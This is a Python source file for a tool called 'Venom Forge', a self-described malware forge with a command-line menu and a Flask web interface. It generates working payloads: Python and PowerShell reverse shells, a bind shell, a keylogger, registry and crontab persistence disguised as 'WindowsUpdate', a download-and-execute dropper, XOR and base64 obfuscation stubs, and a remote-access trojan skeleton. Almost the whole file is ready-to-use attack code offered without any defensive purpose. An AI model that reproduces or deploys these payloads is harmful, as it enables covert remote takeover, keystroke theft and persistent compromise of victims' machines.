# lang: Python 3.10+ | file: venom_forge.py
# deps: pip install flask

import argparse, base64, os, sys, json, textwrap, platform

BANNER = r"""
 ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗    ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
 ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║    ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
 ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║    █████╗  ██║   ██║██████╔╝██║  ███╗█████╗
 ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║    ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
  ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║    ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
   ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
  "We are Venom. We are payload." — MALWARE FORGE v2
"""

README = """
╔══════════════════════════════════════════════════════════════╗
║              VENOM FORGE — README                           ║
╠══════════════════════════════════════════════════════════════╣
║  USAGE CMD  : python venom_forge.py                         ║
║  USAGE WEB  : python venom_forge.py --web [--port N]        ║
╠══════════════════════════════════════════════════════════════╣
║  TOOLS (10)                                                 ║
║  1.  reverse_shell_py    — Python TCP reverse shell         ║
║  2.  reverse_shell_ps1   — PowerShell reverse shell         ║
║  3.  bind_shell_py       — Python bind shell                ║
║  4.  keylogger_py        — pynput keylogger → logfile       ║
║  5.  persistence_win     — Windows registry run key         ║
║  6.  persistence_linux   — Linux crontab persistence        ║
║  7.  dropper_py          — download & exec dropper          ║
║  8.  xor_encoder         — XOR encode payload + stub        ║
║  9.  rat_skeleton_py     — async Python RAT skeleton        ║
║  10. payload_b64_wrapper — base64 wrap any payload          ║
╠══════════════════════════════════════════════════════════════╣
║  DEPS : pip install flask                                   ║
║  NOTE : run listener — nc -lvnp <LPORT> before reverse      ║
║         keylogger needs: pip install pynput                 ║
╚══════════════════════════════════════════════════════════════╝
"""

# ─── PAYLOAD TEMPLATES ────────────────────────────────────────────────────────

def reverse_shell_py(lhost, lport):
    return textwrap.dedent(f"""\
        import socket, subprocess, os
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    """)

def reverse_shell_ps1(lhost, lport):
    return textwrap.dedent(f"""\
        $client = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport})
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{{0}}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }}
        $client.Close()
    """)

def bind_shell_py(lport):
    return textwrap.dedent(f"""\
        import socket, subprocess
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", {lport}))
        srv.listen(1)
        conn, addr = srv.accept()
        while True:
            cmd = conn.recv(4096).decode(errors="replace")
            if not cmd.strip(): break
            out = subprocess.run(cmd, shell=True, capture_output=True)
            conn.send(out.stdout + out.stderr + b"\\n> ")
        conn.close()
    """)

def keylogger_py(logfile="keys.log"):
    return textwrap.dedent(f"""\
        # dep: pip install pynput
        from pynput import keyboard
        import datetime

        LOG = "{logfile}"

        def on_press(key):
            with open(LOG, "a") as f:
                try:
                    f.write(f"{{datetime.datetime.now()}} {{key.char}}\\n")
                except AttributeError:
                    f.write(f"{{datetime.datetime.now()}} [{{key}}]\\n")

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    """)

def persistence_win(payload_path, reg_key_name="WindowsUpdate"):
    return textwrap.dedent(f"""\
        import winreg, sys

        # Adds payload to HKCU Run key — fires on user login
        KEY   = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        VALUE = "{reg_key_name}"
        PATH  = r"{payload_path}"

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, VALUE, 0, winreg.REG_SZ, PATH)
            winreg.CloseKey(key)
            print(f"[+] persistence set: {{VALUE}} → {{PATH}}")
        except Exception as e:
            print(f"[-] failed: {{e}}")
    """)

def persistence_linux(payload_path, cron_schedule="@reboot"):
    return textwrap.dedent(f"""\
        import subprocess, sys

        PAYLOAD  = "{payload_path}"
        SCHEDULE = "{cron_schedule}"

        # read current crontab
        try:
            current = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
        except subprocess.CalledProcessError:
            current = ""

        entry = f"{{SCHEDULE}} python3 {{PAYLOAD}}\\n"
        if entry.strip() in current:
            print("[*] already in crontab")
            sys.exit(0)

        new_crontab = current.rstrip("\\n") + "\\n" + entry
        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
        proc.communicate(input=new_crontab.encode())
        print(f"[+] crontab entry added: {{entry.strip()}}")
    """)

def dropper_py(url, exec_name="update.py"):
    return textwrap.dedent(f"""\
        import urllib.request, os, sys, subprocess, tempfile

        URL      = "{url}"
        FILENAME = "{exec_name}"

        tmpdir  = tempfile.gettempdir()
        outpath = os.path.join(tmpdir, FILENAME)

        print(f"[*] fetching payload from {{URL}}")
        urllib.request.urlretrieve(URL, outpath)
        print(f"[+] saved to {{outpath}}, executing...")
        subprocess.Popen([sys.executable, outpath], close_fds=True)
        print("[+] done, dropper exiting")
    """)

def xor_encoder(payload_str, key=0x41):
    encoded = bytes([b ^ key for b in payload_str.encode()])
    b64     = base64.b64encode(encoded).decode()
    stub = textwrap.dedent(f"""\
        import base64

        KEY     = {key}
        PAYLOAD = "{b64}"

        decoded = base64.b64decode(PAYLOAD)
        code    = bytes([b ^ KEY for b in decoded]).decode()
        exec(compile(code, "<payload>", "exec"))
    """)
    return {"key": key, "b64_encoded": b64, "stub": stub}

def rat_skeleton_py(lhost, lport):
    return textwrap.dedent(f"""\
        # async Python RAT skeleton — connect-back architecture
        # dep: none (stdlib only)
        import asyncio, subprocess, platform, os, sys, json

        LHOST = "{lhost}"
        LPORT  = {lport}

        async def handle(reader, writer):
            writer.write(json.dumps({{
                "os": platform.system(),
                "node": platform.node(),
                "user": os.getlogin(),
                "cwd": os.getcwd(),
            }}).encode() + b"\\n")
            await writer.drain()
            while True:
                try:
                    line = await asyncio.wait_for(reader.readline(), timeout=60)
                    if not line: break
                    cmd = line.decode(errors="replace").strip()
                    if cmd == "exit": break
                    if cmd.startswith("cd "):
                        try: os.chdir(cmd[3:]); out = os.getcwd()
                        except Exception as e: out = str(e)
                    else:
                        proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                        out  = (proc.stdout + proc.stderr).decode(errors="replace")
                    writer.write((out + "\\n[RAT]> ").encode())
                    await writer.drain()
                except asyncio.TimeoutError:
                    break
                except Exception as e:
                    writer.write(f"error: {{e}}\\n".encode())
                    await writer.drain()
            writer.close()

        async def main():
            srv = await asyncio.start_server(handle, LHOST, LPORT)
            async with srv: await srv.serve_forever()

        if __name__ == "__main__":
            asyncio.run(main())
    """)

def payload_b64_wrapper(raw_payload):
    b64 = base64.b64encode(raw_payload.encode()).decode()
    stub = textwrap.dedent(f"""\
        import base64
        exec(base64.b64decode("{b64}").decode())
    """)
    return {"b64": b64, "stub": stub, "one_liner": f'python3 -c "import base64;exec(base64.b64decode(\\"{b64}\\").decode())"'}

# ─── CMD ──────────────────────────────────────────────────────────────────────

TOOLS_VENOM = {
    "1":  ("reverse_shell_py",    lambda: _forge(reverse_shell_py(input("LHOST: "), input("LPORT: ")), "reverse_shell.py")),
    "2":  ("reverse_shell_ps1",   lambda: _forge(reverse_shell_ps1(input("LHOST: "), input("LPORT: ")), "reverse_shell.ps1")),
    "3":  ("bind_shell_py",       lambda: _forge(bind_shell_py(input("LPORT: ")), "bind_shell.py")),
    "4":  ("keylogger_py",        lambda: _forge(keylogger_py(input("logfile[keys.log]: ") or "keys.log"), "keylogger.py")),
    "5":  ("persistence_win",     lambda: _forge(persistence_win(input("payload path: "), input("reg key name[WindowsUpdate]: ") or "WindowsUpdate"), "persistence_win.py")),
    "6":  ("persistence_linux",   lambda: _forge(persistence_linux(input("payload path: "), input("cron schedule[@reboot]: ") or "@reboot"), "persistence_linux.py")),
    "7":  ("dropper_py",          lambda: _forge(dropper_py(input("payload URL: "), input("exec name[update.py]: ") or "update.py"), "dropper.py")),
    "8":  ("xor_encoder",         lambda: print(json.dumps(xor_encoder(input("payload code: "), int(input("XOR key[65]: ") or 65)), indent=2))),
    "9":  ("rat_skeleton_py",     lambda: _forge(rat_skeleton_py(input("LHOST: "), input("LPORT: ")), "rat.py")),
    "10": ("payload_b64_wrapper",  lambda: print(json.dumps(payload_b64_wrapper(input("raw python payload: ")), indent=2))),
}

def _forge(code, default_name):
    print("\n" + "="*60)
    print(code)
    print("="*60)
    fname = input(f"save as [{default_name}] (blank=skip): ").strip() or None
    if fname:
        with open(fname, "w") as f: f.write(code)
        print(f"[+] saved → {fname}")

def cmd_menu():
    print(BANNER); print(README)
    while True:
        print("\n  TOOLS:")
        for k,(name,_) in TOOLS_VENOM.items(): print(f"    [{k:>2}] {name}")
        print("    [ q] quit")
        c = input("\n  >> ").strip()
        if c == "q": break
        if c in TOOLS_VENOM:
            try: TOOLS_VENOM[c][1]()
            except Exception as e: print(f"  [!] {e}")

VENOM_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Venom Forge</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#050008;color:#f0e6ff;font-family:'Courier New',monospace;min-height:100vh}
.header{background:linear-gradient(135deg,#0d001a,#1a0033);border-bottom:2px solid #7c3aed;padding:20px 40px}
.header h1{color:#a78bfa;font-size:1.8em;text-shadow:0 0 20px #7c3aed88}
.header p{color:#5a3a7a;margin-top:5px}
.container{display:flex;min-height:calc(100vh - 100px)}
.sidebar{width:260px;background:#030005;border-right:1px solid #2d1054;padding:20px}
.sidebar h3{color:#7c3aed;margin-bottom:15px;font-size:.9em;letter-spacing:2px}
.tool-btn{display:block;width:100%;padding:10px 15px;margin:4px 0;background:#0d001a;border:1px solid #2d1054;
          color:#c4b5fd;cursor:pointer;text-align:left;font-family:inherit;font-size:.85em;border-radius:4px;transition:all .2s}
.tool-btn:hover,.tool-btn.active{background:#2d1054;border-color:#7c3aed;color:#a78bfa}
.main{flex:1;padding:30px}
.card{background:#030005;border:1px solid #2d1054;border-radius:8px;padding:25px;margin-bottom:20px}
.card h2{color:#7c3aed;margin-bottom:15px;font-size:1.1em}
.form-row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px}
input[type=text]{background:#0d001a;border:1px solid #3d1a66;color:#f0e6ff;padding:8px 12px;border-radius:4px;font-family:inherit;font-size:.9em;min-width:180px}
input:focus{outline:none;border-color:#7c3aed}
.btn{background:#7c3aed;color:#050008;border:none;padding:9px 20px;border-radius:4px;cursor:pointer;font-family:inherit;font-weight:bold;font-size:.9em}
.btn:hover{background:#a78bfa}
.output{background:#020003;border:1px solid #1a0033;border-radius:4px;padding:20px;min-height:120px;white-space:pre-wrap;font-size:.85em;color:#c4b5fd;max-height:500px;overflow-y:auto;margin-top:15px}
.copy-btn{background:#1a0033;color:#a78bfa;border:1px solid #2d1054;padding:5px 12px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:.8em;margin-top:8px}
.copy-btn:hover{background:#2d1054}
.loading{color:#7c3aed;animation:blink 1s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
</style></head><body>
<div class="header">
  <h1>🕷️ VENOM — MALWARE FORGE</h1>
  <p>"We are Venom. We are payload." — 10 payloads, forged clean.</p>
</div>
<div class="container">
<div class="sidebar"><h3>// PAYLOADS</h3>
  <button class="tool-btn active" onclick="showTool('reverse_shell_py')">01 · reverse shell py</button>
  <button class="tool-btn" onclick="showTool('reverse_shell_ps1')">02 · reverse shell ps1</button>
  <button class="tool-btn" onclick="showTool('bind_shell_py')">03 · bind shell py</button>
  <button class="tool-btn" onclick="showTool('keylogger_py')">04 · keylogger py</button>
  <button class="tool-btn" onclick="showTool('persistence_win')">05 · persistence win</button>
  <button class="tool-btn" onclick="showTool('persistence_linux')">06 · persistence linux</button>
  <button class="tool-btn" onclick="showTool('dropper_py')">07 · dropper py</button>
  <button class="tool-btn" onclick="showTool('xor_encoder')">08 · xor encoder</button>
  <button class="tool-btn" onclick="showTool('rat_skeleton_py')">09 · rat skeleton</button>
  <button class="tool-btn" onclick="showTool('payload_b64_wrapper')">10 · b64 wrapper</button>
  <button class="tool-btn" onclick="showTool('readme')" style="margin-top:20px;border-color:#2d1054;color:#6b7280">README</button>
</div>
<div class="main">
  <div id="readme" class="card" style="display:none"><h2>// README</h2><pre id="readme-box" style="color:#5a3a7a;font-size:.82em;line-height:1.6"></pre></div>
  <div id="tool-panel" class="card">
    <h2 id="tool-title">// 01 · REVERSE SHELL PY</h2>
    <div id="tool-form"></div>
    <div id="output" class="output">— ready, forge the payload —</div>
    <button class="copy-btn" onclick="copyOutput()">copy payload</button>
  </div>
</div></div>
<script>
const tools={
  reverse_shell_py:{title:"01 · REVERSE SHELL PY",fields:[{n:"lhost",p:"your IP"},{n:"lport",p:"4444"}]},
  reverse_shell_ps1:{title:"02 · REVERSE SHELL PS1",fields:[{n:"lhost",p:"your IP"},{n:"lport",p:"4444"}]},
  bind_shell_py:{title:"03 · BIND SHELL PY",fields:[{n:"lport",p:"4444"}]},
  keylogger_py:{title:"04 · KEYLOGGER PY",fields:[{n:"logfile",p:"keys.log"}]},
  persistence_win:{title:"05 · PERSISTENCE WIN",fields:[{n:"payload_path",p:"C:\\\\payload.py"},{n:"reg_key_name",p:"WindowsUpdate"}]},
  persistence_linux:{title:"06 · PERSISTENCE LINUX",fields:[{n:"payload_path",p:"/tmp/payload.py"},{n:"cron_schedule",p:"@reboot"}]},
  dropper_py:{title:"07 · DROPPER PY",fields:[{n:"url",p:"http://yourserver/payload.py"},{n:"exec_name",p:"update.py"}]},
  xor_encoder:{title:"08 · XOR ENCODER",fields:[{n:"payload_str",p:"python code to encode"},{n:"key",p:"65"}]},
  rat_skeleton_py:{title:"09 · RAT SKELETON PY",fields:[{n:"lhost",p:"0.0.0.0"},{n:"lport",p:"4445"}]},
  payload_b64_wrapper:{title:"10 · B64 WRAPPER",fields:[{n:"raw_payload",p:"python one-liner"}]},
};
let cur="reverse_shell_py";
function showTool(name){
  document.querySelectorAll(".tool-btn").forEach(b=>b.classList.remove("active"));
  event.target.classList.add("active");
  if(name==="readme"){
    document.getElementById("tool-panel").style.display="none";
    document.getElementById("readme").style.display="block";
    fetch("/readme").then(r=>r.text()).then(t=>document.getElementById("readme-box").textContent=t);
    return;
  }
  document.getElementById("readme").style.display="none";
  document.getElementById("tool-panel").style.display="block";
  cur=name;const t=tools[name];
  document.getElementById("tool-title").textContent="// "+t.title;
  document.getElementById("tool-form").innerHTML=`<div class="form-row">${t.fields.map(f=>`<input type="text" id="f_${f.n}" placeholder="${f.n}: ${f.p}">`).join("")}<button class="btn" onclick="runTool()">▶ FORGE</button></div>`;
  document.getElementById("output").textContent="— ready —";
}
async function runTool(){
  const t=tools[cur];const params={};
  t.fields.forEach(f=>{params[f.n]=document.getElementById("f_"+f.n)?.value||""});
  const out=document.getElementById("output");
  out.innerHTML='<span class="loading">[ forging payload... ]</span>';
  try{
    const r=await fetch("/run",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({tool:cur,params})});
    const d=await r.json();
    if(d.result && typeof d.result === "string") out.textContent=d.result;
    else out.textContent=JSON.stringify(d.result,null,2)||d.error;
  }catch(e){out.textContent="error: "+e}
}
function copyOutput(){
  navigator.clipboard.writeText(document.getElementById("output").textContent).then(()=>{
    const b=document.querySelector(".copy-btn");b.textContent="copied ✓";setTimeout(()=>b.textContent="copy payload",1500);
  });
}
</script></body></html>"""

def run_web(port=5004):
    try: from flask import Flask, request, jsonify
    except ImportError: print("pip install flask"); sys.exit(1)
    app = Flask(__name__)
    @app.route("/")
    def index(): return VENOM_HTML
    @app.route("/readme")
    def readme(): return README
    @app.route("/run", methods=["POST"])
    def run():
        d=request.json; t=d["tool"]; p=d.get("params",{})
        try:
            dispatch={
                "reverse_shell_py":   lambda: reverse_shell_py(p["lhost"],p["lport"]),
                "reverse_shell_ps1":  lambda: reverse_shell_ps1(p["lhost"],p["lport"]),
                "bind_shell_py":      lambda: bind_shell_py(p["lport"]),
                "keylogger_py":       lambda: keylogger_py(p.get("logfile","keys.log")),
                "persistence_win":    lambda: persistence_win(p["payload_path"],p.get("reg_key_name","WindowsUpdate")),
                "persistence_linux":  lambda: persistence_linux(p["payload_path"],p.get("cron_schedule","@reboot")),
                "dropper_py":         lambda: dropper_py(p["url"],p.get("exec_name","update.py")),
                "xor_encoder":        lambda: xor_encoder(p["payload_str"],int(p.get("key",65))),
                "rat_skeleton_py":    lambda: rat_skeleton_py(p["lhost"],p["lport"]),
                "payload_b64_wrapper":lambda: payload_b64_wrapper(p["raw_payload"]),
            }
            result = dispatch[t]()
            return jsonify(result=result)
        except Exception as e: return jsonify(error=str(e))
    print(f"\n  [*] Venom Forge — web UI at http://localhost:{port}")
    app.run(host="0.0.0.0", port=int(port), debug=False)

if __name__ == "__main__":
    ap=argparse.ArgumentParser(); ap.add_argument("--web",action="store_true"); ap.add_argument("--port",type=int,default=5004)
    args=ap.parse_args()
    if args.web: run_web(args.port)
    else: cmd_menu()